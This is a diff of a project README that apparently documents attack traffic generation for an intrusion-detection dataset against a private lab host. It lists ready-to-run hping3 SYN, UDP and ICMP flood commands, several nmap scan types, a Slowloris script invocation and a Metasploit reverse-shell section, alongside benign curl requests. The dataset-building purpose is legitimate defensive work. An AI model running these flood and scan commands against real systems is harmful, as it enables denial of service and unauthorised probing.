@@ -17,28 +17,60 @@ Steps :-
 3. Attack Type Selection
 
 -> We have chossen multiple attacks for the dataset | we have chosen these attacks on the basic of what type of protocols it uses also which port it targets
+-> run these all these commands on attack machine and used the command provided at last to capture the attack traffic after performing the attack
+
+
+
 
 -> SYN Flood
    sudo hping3 -S -p 80 --flood 192.168.100.4
 
+
+
+   
+
 -> UDP Flood
   sudo hping3 --udp -p 53 --flood 192.168.100.4
 
+
+
+  
+
 -> ICMP Flood
   sudo hping3 -1 --flood 192.168.100.4
+
+
+
+  
 
 ->  Nmap Scans
 🔸 Normal TCP Connect Scan -> nmap -sT 192.168.100.4
 🔸 Aggressive Scan with OS and Version Detection -> nmap -A -T4 192.168.100.4
 
+
+
+
 -> FIN Scan
   sudo nmap -sF 192.168.100.4
+
+
+  
 
 -> NULL Scan
   sudo nmap -sN 192.168.100.4
 
+
+
+
+  
+
 -> Xmas Scan
   sudo nmap -sX 192.168.100.4
+
+
+
+
+  
 
 -> Protocol Obfuscation Attack (Slowloris attack performed using Python)
 
@@ -48,6 +80,10 @@ Steps :-
 
   run the attack: 
   python3 slowloris.py 192.168.100.4
+
+
+
+
 
 
 -> Reverse Shell (It is a Metasploit Payload)
@@ -74,6 +110,11 @@ Starting Metasploit Listener:
 
 
 
+
+
+
+
+
 -> Normal Traffic Generation
 
   - Basic Web Browsing
@@ -83,9 +124,15 @@ Starting Metasploit Listener:
 
 
 
+
+
+
 -> HTTP Requests (run Together)
    - curl -X GET http://192.168.100.4/api/test
      curl -X POST -d "data=test" http://192.168.100.4/api/post
+
+
+
 
 
 
